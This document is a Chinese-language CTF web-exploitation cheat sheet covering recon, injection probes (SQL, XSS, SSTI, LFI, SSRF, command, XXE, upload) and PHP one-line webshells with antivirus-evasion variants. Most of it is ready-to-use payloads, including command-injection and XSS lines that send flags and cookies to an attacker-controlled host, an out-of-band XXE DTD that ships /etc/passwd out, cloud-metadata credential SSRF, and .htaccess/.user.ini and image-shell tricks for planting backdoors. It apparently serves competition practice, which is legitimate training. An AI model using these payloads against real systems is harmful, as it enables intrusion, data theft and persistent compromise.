# quickref|极速速查|🚀
## [recon] 信息收集速查——拿到靶机 / 题目后的标准起手式，按顺序快速过一遍。
### [rec-checklist] 信息收集 10 分钟清单 | easy | 信息收集;侦察;checklist | 信息收集清单;recon checklist;打点流程
> 从拿到 URL 到开始攻击的完整检查顺序
## 标准流程（按顺序执行，缺一不可）

1. **看页面本身** → 首页源码、注释、`<script>` 引入的 JS、隐藏 tab、`view-source:` 里的线索
2. **robots.txt / sitemap.xml** → 可能直接暴露后台路径
3. **HTTP 响应头** → `Server`、`X-Powered-By`、`Set-Cookie` 泄露技术栈
4. **目录扫描**（dirsearch/ffuf/gobuster）→ 后台、备份、上传目录
5. **源码泄露探测** → `.git/` `.svn/` `.DS_Store` `.env` 备份文件
6. **JS 分析** → 接口路径、API 密钥、加密/签名逻辑（常藏 flag 线索）
7. **功能点枚举** → 登录、注册、上传、搜索、下载、报错信息
8. **参数 fuzz** → 常见参数名：`id` `file` `url` `path` `cmd` `page` `redirect` `target` `next` `name`
9. **端口/服务** → `nmap -sV -p-`；Web 常见 80/8080/8888/8000/3000/5000/9000/8081
10. **常见后台路径**：`/admin` `/login` `/manage` `/console` `/phpmyadmin` `/api` `/swagger-ui.html` `/actuator` `/adminer`

> [!warn] 有的题信息藏在「新手引导」「管理接口」里；先全文检索页面所有 `<script src>` 的 JS 文件，再开始爆破。

## 常用快速命令

```bash
# 看响应头
curl -sI http://target/

# 全量响应（含正文）
curl -s http://target/ -i

# 抓取页面里的 URL 与路径
curl -s http://target/ | grep -oE '(src|href)="[^"]+"'

# 探测备份/敏感文件（一个列表）
for f in robots.txt sitemap.xml .git/config .svn/entries .DS_Store .env backup.zip www.zip flag.txt; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/$f); echo "$code $f"; done
```

> [!tip] 题目页面藏提示时，把整页源码 + 所有 JS 下载到本地，用 `grep -iE 'flag|key|token|admin|secret'` 全文搜一遍。
### [rec-common-files] 敏感文件与备份文件速查 | easy | 信息收集;源码泄露;备份文件 | 敏感文件;备份泄露;.git;.DS_Store;.env
> 常见可直接访问的泄露文件清单
## 高价值文件列表（直接访问 URL 试一遍）

| 文件 | 说明 | 利用价值 |
|---|---|---|
| `robots.txt` | 爬虫规则 | 暴露后台/敏感路径 |
| `sitemap.xml` | 站点地图 | 页面枚举 |
| `.git/` | Git 源码目录 | **完整源码泄露**，可 `git log/diff` 还原 |
| `.svn/entries` | SVN 元数据 | 旧版本文件泄露 |
| `.DS_Store` | macOS 目录索引 | 泄露文件名列表 |
| `.env` | 环境变量 | **数据库密码、密钥、token** |
| `backup.zip` / `bak.zip` | 整站备份 | 源码+配置全拿 |
| `www.zip` / `site.zip` | 常见备份名 | 同上 |
| `*.sql` / `db.sql` / `data.sql` | 数据库导出 | 用户表/密码哈希 |
| `config.php.bak` / `config.php~` / `.swp` | 编辑器备份 | 配置文件泄露 |
| `phpinfo.php` / `info.php` | 环境探针 | 版本、扩展、路径 |
| `.htaccess` | Apache 配置 | 解析规则/重写规则 |
| `crossdomain.xml` | 跨域策略 | 判断 Flash/插件利用面 |
| `swagger-ui.html` / `api-docs` | 接口文档 | **接口名全暴露** |
| `actuator` / `actuator/env` | Spring 监控 | 环境变量、配置泄露 |

## .git 泄露恢复

```bash
# 存在 .git/config 即中招；用工具一键还原源码
python3 GitHack.py http://target/.git/
git dirsearch -u http://target -e php,txt,html

# 手动思路：能访问 .git/index 就能逐步还原（工具有：GitHack、GitHacker、dvcs-ripper）
```

> [!danger] `.git` 目录是否可访问用 `curl -sI http://target/.git/HEAD` 判断；返回 200 且内容含 `ref:` 即泄露。
### [rec-dirbrute] 目录爆破速查命令 | easy | 信息收集;目录扫描;爆破 | dirsearch;gobuster;ffuf;目录扫描
> dirsearch / ffuf / gobuster 一行命令模板
> [!info] 线下赛默认字典优先用**小字典**（速度快、命中率高）：常见后台名、备份名、文件名。大字典留给无果时第二轮。

## dirsearch（最常用）

```bash
# 基础
python3 dirsearch.py -u http://target/ -e php,txt,html,zip,bak,sql

# 指定字典、并发、排除 404
python3 dirsearch.py -u http://target/ -w dict.txt -t 50 -x 403,404

# 全面扫（默认字典 + 扩展）
python3 dirsearch.py -u http://target/ -e *
```

## ffuf（更快，支持 fuzz 多个位置）

```bash
ffuf -u http://target/FUZZ -w dict.txt -mc 200,301,302 -t 64

# 同时 fuzz 参数名
ffuf -u 'http://target/index.php?FUZZ=1' -w params.txt

# 排除常见大小响应
ffuf -u http://target/FUZZ -w dict.txt -fs 1234
```

## gobuster

```bash
gobuster dir -u http://target/ -w dict.txt -x php,txt,bak -t 50
```

## 字典要点

| 类别 | 典型词 |
|---|---|
| 后台 | admin, manage, manager, console, dashboard, control, system, user, member, adminer |
| 上传 | upload, uploads, files, img, images, static, attachment, att |
| 备份 | backup, bak, www, web, site, old, test, tmp, temp |
| 接口 | api, v1, v2, swagger, docs, graphql |
| 源码 | src, source, git, .git, static/js, assets |
| 管理工具 | phpmyadmin, adminer, phpinfo, info, test, flag |

> [!tip] 看到 200 但页面是同一张「404 首页」时，用 `-fs`（filter size）把相同内容的响应过滤掉，避免被假 200 干扰。
### [rec-jsrecon] JS 分析与接口提取 | medium | 信息收集;JS分析;前端审计;密钥提取 | js分析;sourcemap;接口提取;jsfind
> 从 JS 文件中提取接口、密钥、加密逻辑的方法
## 为什么重要

前端 JS 通常包含：API 接口路径、管理员接口、AppKey/AppSecret、加密算法、签名逻辑、隐藏功能路由。**CTF 里经常直接藏 flag 或后台跳转。**

## 提取流程

1. 页面源码收集所有 JS：

```bash
curl -s http://target/ | grep -oE '<script[^>]+src="[^"]+"' | grep -oE 'src="[^"]+"'
# 或直接：
curl -s http://target/ | grep -oE '"[^"]*\.js"' | sort -u
```

2. 批量下载到本地：

```bash
mkdir js && curl -s http://target/ | grep -oE '(src|href)="[^"]*\.js"' | cut -d'"' -f2 | while read u; do curl -s "http://target$u" -o "js/$(basename $u)"; done
```

3. 全文搜索敏感内容：

```bash
grep -rniE 'apiKey|appKey|secret|token|password|admin|/api/|flag|key=' js/

# 提取所有接口路径
cat js/*.js | grep -oE '"/(api|admin|v[0-9])/[^" ]*"' | sort -u

# 提取链接
cat js/*.js | grep -oE 'https?://[^"'"'"']+' | sort -u
```

## Source Map 还原（webpack 打包）

```bash
# 找到 .js.map 文件，或 JS 末尾注释 //# sourceMappingURL=xxx.js.map
curl -s http://target/js/app.js.map -o app.js.map

# 用工具还原源码
npx source-map-explorer app.js  # 或 node 脚本 + source-map 包
python3 -m pip install sourcemap && python3 -c "import sourcemap; print(sourcemap.discover(sourcemap.load('app.js.map')))"
```

> [!warn] 还原出的源码里常能找到**前后端交互接口全集**，配合越权/认证绕过使用价值极高。

## 前端加密/签名逻辑绕过

- 网站的加密、签名、参数拼装全在前端 → **直接复制 JS 里的逻辑**（或改成本地 node 执行）重新计算结果。
- 请求前打断点（DevTools → Sources）看加密参数来源，比逆向服务器快得多。
- 常见：`md5`、`sha1`、`base64`、自写混淆函数，全部能在 JS 里找到实现。

> [!tip] 浏览器 F12 → Network → 过滤 `JS`，逐个看；关键词搜 `ajax`/`fetch(`/`axios`/`XMLHttpRequest` 定位请求构造点。
### [rec-all-in-one] 比赛侦察代码大全：框架/服务/题型一页通 | medium | 侦察;框架识别;服务;速查;cheatsheet | 侦察大全;框架速查;服务速查;cheatsheet
> 比赛时"这网站是什么技术栈、该打哪里"的一页通。左边特征对上了，右边直接打。每个大类的深入玩法在知识库对应分类里（按标签可搜到）。
#### ① 通用三板斧（所有题先做这三步）
```bash
curl -sI http://目标/                 # 响应头：Server / X-Powered-By 泄露技术栈
curl -s http://目标/ -i                # 完整响应（正文+头）
curl -s http://目标/robots.txt        # 后台路径
# 敏感文件一轮扫
for f in robots.txt sitemap.xml .git/config .env backup.zip www.zip flag.txt; do curl -s -o /dev/null -w "$f %{http_code}\n" http://目标/$f; done
nmap -sV -p- http://目标               # 全端口+服务版本
```
#### ② 框架识别速查（特征对上 → 打右列）
| 特征 | 框架 | 直接试的路径/接口 |
|---|---|---|
| X-Powered-By: PHP、`?s=` 参数 | ThinkPHP | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`（老版本 RCE） |
| `?_method=` 参数、路由报错 | Laravel | app_key 泄露、老版本反序列化 |
| `/wp-login.php`、`/wp-content/` | WordPress | 插件漏洞、弱口令、xmlrpc.php |
| `/actuator`、`/actuator/env`、`/jolokia` | Spring Boot | 配置/环境变量泄露，可升级 RCE |
| `/manager/html`、PUT 传 .jsp | Tomcat | 弱口令 + CVE-2017-12615 PUT 写 shell |
| Cookie 带 rememberMe | Apache Shiro | Shiro 反序列化（key 爆破） |
| 报错含 fastjson、有 type 参数 | Fastjson | 反序列化 RCE（按版本选链） |
| `/console` 控制台 | Weblogic | 弱口令 + 反序列化 CVE |
| X-Powered-By: Express、报错栈 node:internal | Node.js/Express | 源码泄露（/App.js）、EJS 模板注入、原型污染（见 11-lang） |
| 模板里 `<%= %>` 生效 | EJS | 模板注入 RCE（见 node-static-server-write 条目） |
| Werkzeug 报错、/console | Flask | console RCE、debug PIN、SSTI `{{7*7}}` |
| /admin 后台、DEBUG 报错 | Django | 弱口令、越权、settings 泄露 |
| /docs、/redoc、/openapi.json | FastAPI | 接口文档全暴露，直接开打 |
| 404 是 "404 page not found"（gin 风格） | Go/Gin | 直接打业务接口 |
#### ③ 服务速查（端口/特征对上 → 直接试）
| 端口/特征 | 服务 | 未授权/利用入口 |
|---|---|---|
| 6379 | Redis | 未授权：`redis-cli -h 目标` → info、写 crontab/ssh key |
| 3306 | MySQL | 弱口令 root/root，`mysql -h 目标 -uroot -proot -e "select ..."` |
| 27017 | MongoDB | 未授权：`mongo 目标:27017` 直接查库 |
| 9200 | Elasticsearch | `/_cat/indices` 未授权读库 |
| 8080 + /script、/manage | Jenkins | 弱口令 → /script Groovy RCE |
| 80 + /users/sign_in | GitLab | 注册、越权、历史 CVE |
| 3000 + /api/datasources | Grafana | 未授权、CVE-2021-43798 任意文件读 |
| 8848 | Nacos | /nacos/v1/auth/users 未授权、默认密钥 |
| 2375 | Docker API | 未授权：`docker -H 目标:2375 ps` → 挂载逃逸 |
| 10250 | Kubelet | `curl -k https://目标:10250/run/...` 未授权执行 |
| 21 | FTP | 匿名登录 anonymous/anonymous |
| /phpmyadmin、/adminer | 数据库面板 | 弱口令直连 |
#### ④ 题型（漏洞类型）检测速查（对上 → 去对应分类找深入 payload）
| 类型 | 万能检测（先打这个） | 确认标志 |
|---|---|---|
| 命令注入 | 参数后接 `;id`、`|id`、`$(id)`、反引号 | 回显 uid= |
| 模板注入 SSTI | `<%=7*7%>`、`{{7*7}}`、`${7*7}` 换着试 | 回显 49 |
| SQL 注入 | 参数加 `'` 看报错；`' or 1=1-- -` | 报错/绕过登录 |
| 路径穿越 | `../../../../etc/passwd`、`..%2f..%2fetc/passwd` | 回显 root:x:0:0 |
| SSRF | 参数传 `http://127.0.0.1/`、dnslog 外带 | 有回显/有请求 |
| 文件上传 | 传图片马，后缀 php/jsp 变体 | 能访问到上传文件 |
| 反序列化 | 找特征（Shiro rememberMe、fastjson type、yaml） | 报错泄露库名 |
| JWT | header 改 alg:none；弱密钥爆破 | 伪造成功 |
| 原型污染 | POST `{"__proto__":{"isAdmin":true}}` | 页面行为变化 |
| XXE | 传 XML 带 `<!ENTITY e SYSTEM "file:///etc/passwd">` | 回显文件内容 |
| XSS | `<script>alert(1)</script>`、`<img src=x onerror=alert(1)>` | 弹窗 |
| 越权 | 换 id/用户名遍历 | 拿到别人的数据 |
| 弱口令 | admin/admin、admin/123456、root/root | 登录成功 |
#### ⑤ 拿 Shell 之后（提权三板斧）
```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; ls -la /; env; cat /etc/passwd
```
- 有 sudo → GTFOBins 查对应命令；有 SUID → GTFOBins 的 SUID 列
- flag 读不了先找 /readflag 类 SUID 助手；`env` 里常有平台 flag（GZCTF_FLAG 等）

## [probe] 漏洞探测 Payload 速查——遇到功能点先打一发探测 payload，确认漏洞类型再深入。
### [probe-sqli] SQL 注入快速探测 | easy | SQL注入;探测;payload | sql探测;注入检测;union select
> 判断参数是否存在 SQL 注入的完整验证链
## 验证流程（由轻到重）

1. **单引号报错**：
```sql
'  → 报错/页面空白 = 有戏
```
2. **恒真恒假对比**：
```sql
1' and '1'='1   -- 正常
1' and '1'='2   -- 异常
```
3. **注释符收尾**（各数据库不同，逐个试）：
```sql
-- -     --+    #    /* */    ;%00
-- 后面要有空格
```
4. **报错注入**（MySQL）：
```sql
' and updatexml(1,concat(0x7e,version()),1)-- -
' and extractvalue(1,concat(0x7e,database()))-- -
' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
```
5. **布尔盲注**：
```sql
1' and if(ascii(substr(database(),1,1))>100,1,0)-- -   # 二分法逐字符猜
1' and (select ascii(substr(database(),1,1)))=100-- -
```
6. **时间盲注**（无回显无报错时）：
```sql
1' and sleep(5)-- -                # MySQL
1'; SELECT pg_sleep(5)-- -          # PostgreSQL
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -   # Oracle
1' WAITFOR DELAY '0:0:5'-- -       # MSSQL
```
7. **联合注入找列数**：
```sql
1' order by 10-- -      # 报错即超出列数，二分找列数
1' union select 1,2,3,4-- -
```

## 无空格 & 关键字符绕过（经典）
```sql
1'/**/or/**/1=1-- -          # /**/ 替代空格
1'%0aor%0a1=1-- -            # %0a 换行（常用于 http 参数）
1'||1=1-- -                  # || 逻辑或（PG/SQLite/Oracle）
1' AND 1=1 AND (3=3) AND 1-- - # 括号分隔
```

> [!danger] 探测顺序：报错 → 恒真假 → 联合 → 盲注。时间盲注放最后（慢）。全部失败再考虑宽字节、编码绕过或二次注入。
### [probe-xss] XSS 快速探测 | easy | XSS;探测;payload | xss探测;alert;onerror
> 快速确认反射/存储 XSS 的最短 payload
## 先确认「回显位置」

payload 前先把输入原样输出到哪搞清楚：HTML 标签内？属性内？JS 字符串内？`<script>` 里？

## 裸回显（直接插进 HTML）

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

## 属性内注入（先闭合）

```html
" onmouseover="alert(1)
' autofocus onfocus='alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

## JS 字符串内注入

```html
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
```

## 过滤绕过常用手法（速查）

| 过滤 | 绕过 |
|---|---|
| 过滤 `<script>` | 换 `<img onerror>`/`<svg onload>`/`<body onload>` 等事件标签 |
| 过滤 `alert(` | 用 ``alert`1` ``（反引号）或 `alert\u00281\u0029` |
| 过滤括号 | `onerror=alert\`1\`` 反引号调用 |
| 过滤关键字 | 大小写混合 `<ImG sRc=x oNeRrOr=alert(1)>`（HTML 标签属性不区分大小写） |
| 过滤引号 | `<img src=x onerror=alert(1)>` 数字/变量直接传 |
| 过滤空格 | `<img/src=x/onerror=alert(1)>` |
| 字符实体 | `onerror=&#97;lert(1)`（被 HTML 实体解码后再执行） |

> [!tip] 验证 payload 效果：`<img src=x onerror=alert(document.domain)>` 弹域名证明同源；比赛里经常要打 admin 的 cookie，可用 `location='http://yourip/'+document.cookie` 外带（线下赛可搭本地监听：`nc -lvnp 8080`）。
### [probe-ssti] SSTI 模板注入快速探测 | medium | SSTI;模板注入;探测 | ssti探测;jinja2;twig;7*7
> 一步区分引擎、两步拿 RCE 的探测链
## 第一步：确认注入（输入 7*7）

| 引擎 | 语法 | 结果 |
|---|---|---|
| Jinja2 / Twig / Django | `{{7*7}}` | 49 |
| Smarty | `{$smarty.version}` / `{7*7}` | 版本 / 49 |
| FreeMarker | `${7*7}` | 49 |
| Velocity | `#set($x=7*7)$x` | 49 |
| ERB (Ruby) | `<%= 7*7 %>` | 49 |
| JSP EL | `${7*7}` | 49 |
| Nunjucks | `{{7*7}}` | 49 |
| Angular | `{{7*7}}` | 49 |

> [!info] `{{7*'7'}}`：Jinja2 返回 `7777777`，Twig 返回 49 —— 用于区分 Jinja2 与 Twig。

## 第二步：探测对象/沙箱

```
{{config}}            # Jinja2 配置对象（存在即注入成功）
{{7*'7'}}             # 7777777 = Jinja2
{{lipsum}}            # Jinja2 内置函数，常被用来逃逸
{{''.__class__}}      # 查看类信息
{{self.__class__}}    # 自身类
```

## 第三步：RCE（Jinja2 经典链）

```
{{ ''.__class__.__mro__[1].__subclasses__() }}        # 列出所有子类
{{ ''.__class__.__mro__[2].__subclasses__() }}        # 各版本不同
# 找到 subprocess.Popen 的索引 N 后：
{{ ''.__class__.__mro__[2].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

> [!warn] 找 `subprocess.Popen` 索引的通用姿势：本地跑一个 python 列 `__subclasses__` 数索引。过滤 `.` 时换 `attr()` 过滤器：`{{''|attr('__class__')}}`。
### [probe-lfi] 文件包含 / 任意文件读取探测 | medium | 文件包含;LFI;伪协议;探测 | lfi;rfi;php filter;文件读取
> LFI/RFI 与 php://filter 读源码的标准姿势
## 找参数

典型参数名：`file` `page` `path` `include` `template` `lang` `load` `view` `doc` `download`。参数值像路径（如 `index.php`、`about.html`）就是重点。

## 基础探测

```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd        # 过滤 ../ 时
?file=..%2f..%2f..%2fetc/passwd           # URL 编码
?file=..%252f..%252f..%252fetc/passwd     # 双重编码
file=/etc/passwd                          # 绝对路径绕过
```

## PHP 伪协议（读了源码才能打）

```
?file=php://filter/convert.base64-encode/resource=index.php   # 读源码（base64 防解析）
?file=php://filter/read=convert.base64-encode/resource=config.php
?file=php://input                          # POST 提交 PHP 代码执行（需 allow_url_include）
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+   # data 协议执行
?file=php://filter/convert.base64-encode/resource=../flag.php
```

> [!danger] 读源码输出的是 base64，别忘了解码。`php://filter` 对绝大多数 PHP 题目是**第一选择**。

## 日志 / 会话包含（无伪协议时）

```
?file=/var/log/nginx/access.log      # 日志里带 User-Agent，UA 里写马 → 包含即执行
?file=/var/log/apache2/access.log
?file=/proc/self/environ             # 环境变量里也带 UA
?file=/tmp/sess_<sessionid>          # session 文件包含（可先往 session 里塞马）
```

## 常用读取目标

```
/etc/passwd
/proc/self/cmdline
/proc/self/environ
/flag, /flag.txt, /flag.sh
/var/www/html/flag.php
index.php / config.php / db.php
/app/app.py, /app/main.py           # Python 题目
```
### [probe-ssrf] SSRF 快速探测 | medium | SSRF;内网探测;探测 | ssrf探测;169.254.169.254;gopher
> 确认 SSRF、读文件、打内网的探测链
## 找触发点

有「提交 URL」「抓取网页」「图片代理」「远程加载」「webhook 测试」等功能的参数：`url` `target` `link` `img` `src` `dest` `fetch` `redirect`。

## 确认存在

```
# 本机回环（有差异即存在）
?url=http://127.0.0.1:80
?url=http://127.0.0.1:22        # 端口不同响应不同

# 外带确认（自己在 VPS/靶机监听）—— 线下赛可先在本地起 nc 监听验证
?url=http://127.0.0.1:8888
```

## 读文件 / 协议利用

```
?url=file:///etc/passwd
?url=file:///flag
?url=dict://127.0.0.1:6379/info         # dict 协议探测 redis
?url=gopher://127.0.0.1:6379/_*1%0d%0a...   # gopher 打 redis 写 webshell
?url=http://169.254.169.254/latest/meta-data/   # 云元数据（AWS）
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://100.100.100.200/latest/meta-data/    # 阿里云
?url=http://metadata.google.internal/computeMetadata/v1/   # GCP（需头 Metadata-Flavor: Google）
```

## 内网端口探测（盲打）

```bash
# 时间差异法（服务响应快慢不同）
for p in 80 443 22 3306 6379 8080 9200; do
  time curl -s -o /dev/null --connect-timeout 2 "http://target/ssrf?url=http://127.0.0.1:$p" &
done
# 或用响应内容长度判断：不同端口页面源码不同
```

## 绕过限制（速查）

| 手法 | 示例 |
|---|---|
| 进制 IP | `2130706433`、`0x7f000001`、`0177.0.0.1` |
| 短域名 | `http://0`、`http://127.1`、`http://0x7f.1` |
| 重定向 | 先访问自己控制的 302 → 跳内网 |
| DNS 重绑定 | 域名第一次解析公网 IP、第二次解析 127.0.0.1 |
| @ 与 # | `http://allowed.com@127.0.0.1`、`http://127.0.0.1#allowed.com` |
| 编码 | `http://127.0.0.1%2523` 双重编码 |

> [!danger] 有白名单校验域名时优先打 DNS 重绑定；有线上的可以在线生成 rebind 域名，线下题一般直接放行或不校验。
### [probe-rce] 命令注入快速探测 | medium | 命令注入;RCE;探测 | 命令执行;command injection;rce探测
> 命令注入的分隔符、闭合与无回显判定
## 触发点

ping、traceroute、whois、nslookup、下载、导出（zip）、命令行执行面板等功能；参数 `ip` `host` `domain` `cmd` `command` `exec` `task`。

## 分隔符速查

```
; id        # 顺序执行
| id        # 管道
|| id       # 前者失败才执行
&& id       # 前者成功才执行
`id`        # 反引号命令替换
$(id)       # 命令替换
%0aid       # 换行（HTTP 参数里最常用）
%0a id %0a  # 前后换行闭合
& id        # 后台执行
```

## 闭合场景（如 ping 接收 IP）

```
127.0.0.1;id
127.0.0.1|id
127.0.0.1&&id
127.0.0.1%0aid
127.0.0.1$(id)
`id`127.0.0.1
'`id;`'      # 引号闭合后插入
";ls;#
' ; ls ; '
```

## 无回显判定（盲执行）

```
# 时间盲注：
;sleep 5
%0asleep 5

# 外带（把结果发给自己）：
;curl http://your:8080/$(whoami)
;wget http://your:8080/$(cat /flag)

# 写文件后再读：
;echo $(id) > /tmp/xx.txt   # 再配合任意文件读取/包含
```

## 空格/字符过滤绕过

```
${IFS}id                      # $IFS 替代空格
{cat,/etc/passwd}             # 花括号替代空格
cat${IFS}/etc/passwd
echo$IFS'Y2F0IC9ldGMvcGFzc3dk'|base64$IFS-d|sh    # 编码绕过
id%09                        # %09 制表符
cat</etc/passwd              # 重定向符替代空格
```

> [!warn] 过滤 `;|&` 时优先试 `%0a`（换行）与 `$(...)`/反引号；过滤命令名时试 `base64 解码后执行` 或 `c''at`、`c\at`、`uNIQUe`（大小写）。
### [probe-upload] 文件上传快速探测 | medium | 文件上传;getshell;探测 | upload绕过;上传检测链
> 按黑名单→内容→白名单的绕过顺序测试上传点
## 测试顺序（逐层降级）

1. **直接传 webshell**：`shell.php`（内容 `<?php @eval($_POST['x']);?>`）。成功 = 万岁
2. **黑名单后缀绕过**：`.php5 .phtml .pht .php3 .php4 .phar`、大小写 `.PhP`、双写 `.pphphp`、空格/点/`::$DATA` 结尾 `.php.` `.php::$DATA`、换行截断
3. **内容检测绕过**：图片马（`copy /b a.jpg+shell.php s.jpg`）、magic bytes 前缀、二次渲染恢复马（用工具处理）、`exif` 注释写码
4. **白名单/类型检测**：`Content-Type: image/jpeg` 伪造、改后缀为 jpg 配合解析漏洞/\.htaccess 上传
5. **解析漏洞**：Apache 多后缀 `shell.php.jpg`、`.htaccess` 覆盖、Nginx 畸形解析、IIS 分号截断

## 快速验证访问

```bash
# 上传后访问常见目录
for d in upload uploads files static img images; do
  curl -s -o /dev/null -w '%{http_code} $d/shell.php' http://target/$d/shell.php; echo; done

# 找到后直接连马（蚁剑/菜刀），或命令行：
curl -s http://target/upload/shell.php -d 'x=system("id");'
```

## 常见检查要点

| 检测方式 | 绕过 |
|---|---|
| 后缀黑名单 | 同义后缀、大小写、双写、`.htaccess`/`.user.ini` |
| MIME 检查 | 改 Content-Type |
| 文件头检查 | 文件前加 `GIF89a` / `\xFF\xD8\xFF`（jpg）| 
| 内容黑名单 | 拆分 eval 为 `ev\al`、编码、回调函数免杀 |
| 前端校验 | 抓包改包直接绕过（根本不看前端） |
| 目录不可预测 | 看返回的路径 / 时间戳爆破 / 上传响应头 Location |

> [!danger] 上传后**立刻**尝试访问确认路径与可执行性；比赛里常见「上传成功但目录猜不到」，多试 `year/month/day` 时间戳目录。
### [probe-xxe] XXE 快速探测 | medium | XXE;XML;探测 | xxe探测;外部实体;blind xxe
> XML 解析入口的 XXE 验证与利用
## 触发点

提交 XML 的功能：登录 XML、SOAP 接口、RSS 导入、Excel/Word 解析（docx 本质是 XML）、svg 上传、`Content-Type: application/xml` 的接口。

## 有回显读文件

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>
<root>&e;</root>
```

读 PHP 源码（配合 filter）：

```xml
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=flag.php">]>
```

## 探测存在（盲 XXE）

```xml
<!-- 让解析器访问自己，收到请求即存在 -->
<!DOCTYPE x [<!ENTITY e SYSTEM "http://YOUR_IP:8080/xxe">]>
<root>&e;</root>
```

## 盲 XXE 带外读取（经典外带 DTD）

1. 自己服务器放置恶意 DTD（`evil.dtd`）：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR_IP:8080/?%file;'>">
%all;
```

2. 靶机提交：

```xml
<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://YOUR_IP:8080/evil.dtd"> %dtd;]>
<root/>
```

3. 监听 `nc -lvnp 8080`，URL 参数里就是文件内容。

> [!warn] 文件内容含特殊字符会破坏 URL，外带失败时把 `file://` 换成 `php://filter/convert.base64-encode/resource=` 再带外。

## 绕过过滤器

| 过滤 | 绕过 |
|---|---|
| 禁 `DOCTYPE` | 参数实体仍可：`<!DOCTYPE x [<!ENTITY % d SYSTEM "..."> %d;]>`（部分解析器区分） |
| 禁外部实体 | `xinclude`：`<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text">` |
| 禁 file 协议 | `http://` 打 SSRF、`expect://id`（需 PHP expect 扩展）、`file:///proc/self/environ` |
| 无回显 | 带外 DTD（见上） |

> [!tip] 上传 `.svg` / `.docx` 是常见入口：把 svg 内容改成 XXE payload 上传即可触发解析。
## [getshell] 一句话 GetShell 速查——拿到上传/写入/包含点后，最快落地一句话木马。
### [shell-php] PHP 一句话木马速查 | easy | webshell;一句话;getshell;PHP | 一句话木马;eval;assert;蚁剑
> 最常用 PHP 一句话及其连接方式
## 最常用（蚁剑/菜刀/MaMa 直连）

```php
<?php @eval($_POST['x']);?>
<?php @assert($_POST['x']);?>        // PHP < 7.2 可用（7.2+ 移除 assert 字符串执行）
<?php @system($_POST['x']);?>        // 有回显命令执行
<?php @passthru($_POST['x']);?>      // 输出原始结果
<?php $_GET['a']($_GET['b']);?>      // 动态函数：?a=assert&b=phpinfo()
<?php call_user_func($_POST['a'],$_POST['b']);?>
<?php @eval($_REQUEST['x']);?>       // $_REQUEST 兼容 GET/POST/Cookie
```

## 免杀变形思路（被 D 盾/安全狗拦截时）

```php
<?php $a='ev'.'al'; $a($_POST['x']);?>
<?php $a=base64_decode('ZXZhbA=='); $a($_POST['x']);?>
<?php @eval(base64_decode($_POST['x']));?>      // 传码也 base64
<?php $f='\x65\x76\x61\x6c'; $f($_POST['x']);?>
<?php @preg_replace('/a/e',$_POST['x'],'a');?>   // 老版本 /e 修饰符
<?php $k='e'.chr(118).'al'; $k($_POST['x']);?>
```

## 无字母数字马（写法复杂，比赛少用）

```php
<?php $_=[];$_[+$_]="";...  // 异或自增构造，工具：php_mt 编码器
```

## 连接方式

```bash
curl -s http://target/shell.php -d 'x=system("id");'
curl -s http://target/shell.php --data 'x=phpinfo();'
```

> [!tip] 工具连接：**蚁剑**（AntSword，默认协议 `@eval($_POST['x'])` 配 `x` 密码）、**冰蝎**（需 AES 密钥、流量加密）、**哥斯拉**（Godzilla）。

> [!danger] 别在非靶机环境放马！线下赛只在靶机/题目环境使用，赛后可删。
### [shell-htaccess] .htaccess / .user.ini 解析绕过 | medium | 文件上传;getshell;htaccess;user.ini | htaccess上传;user.ini;解析漏洞
> 通过配置文件让任意后缀被解析成 PHP
## .htaccess（Apache，放上传目录）

```apache
# 让 .jpg 按 PHP 解析
AddType application/x-httpd-php .jpg

# 或者把 shell.jpg 当 php 处理
SetHandler application/x-httpd-php
```

配合上传一个内容为马的 `shell.jpg`，访问 `shell.jpg` 即执行。

> [!info] 前提：`AllowOverride All`（Apache 默认常见于靶场环境）。文件上传功能未过滤 `.htaccess` 就能打。

## .user.ini（PHP-FPM / CGI 环境通用）

```ini
; 让每个 PHP 请求前自动包含指定文件
; 文件名必须是 .user.ini；auto_prepend_file 的值一般要写相对路径
auto_prepend_file=a.png
```

上传 `a.png`（内容为一句话 `<?php @eval($_POST['x']);?>`），再访问任意 `.php` 文件即被包含执行。

> [!warn] `user_ini.filename` 默认 `.user.ini`、`user_ini.cache_ttl` 默认 300 秒：上传后等几秒再访问生效。

## 对比速查

| 方式 | 环境 | 条件 | 效果 |
|---|---|---|---|
| `.htaccess` AddType | Apache | AllowOverride All | 指定后缀按 PHP 解析 |
| `.user.ini` prepend | PHP-FPM/CGI | 同目录有 php 文件 | 每个 php 请求先包含马 |
| 多后缀解析 | Apache | handler 匹配最后后缀 | `shell.php.jpg` 里 php 码可执行 |

> [!tip] 上传目录不可执行就拿不到 shell，可以尝试所有上传目录逐个访问确认。
### [shell-img] 图片马制作 | easy | 文件上传;getshell;图片马 | 图片马;copy /b;exif;二次渲染
> 把 PHP 代码藏进图片的三种做法
## 方法一：直接拼接

```bash
# Windows
copy /b a.jpg + shell.php s.jpg

# Linux
cat a.jpg shell.php > s.jpg
```

访问 + 包含（LFI）或触发解析即执行。

## 方法二：EXIF 注释写马

```bash
exiftool -Comment='<?php @eval($_POST["x"]);?>' a.jpg
# 或
exiftool -Copyright='<?php @eval($_POST["x"]);?>' a.jpg
```

